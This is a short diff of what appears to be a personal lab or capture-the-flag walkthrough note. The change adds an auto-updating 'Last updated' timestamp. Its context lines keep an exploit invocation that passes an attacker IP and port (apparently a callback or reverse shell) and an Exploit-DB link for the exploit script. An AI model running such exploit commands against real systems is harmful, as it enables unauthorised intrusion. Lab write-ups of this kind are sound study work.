@@ -101,3 +101,6 @@ python3 exploit.py /dev/shm/$file 10.10.14.126 1234
 
 ## exploit.py
 https://www.exploit-db.com/exploits/51249
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
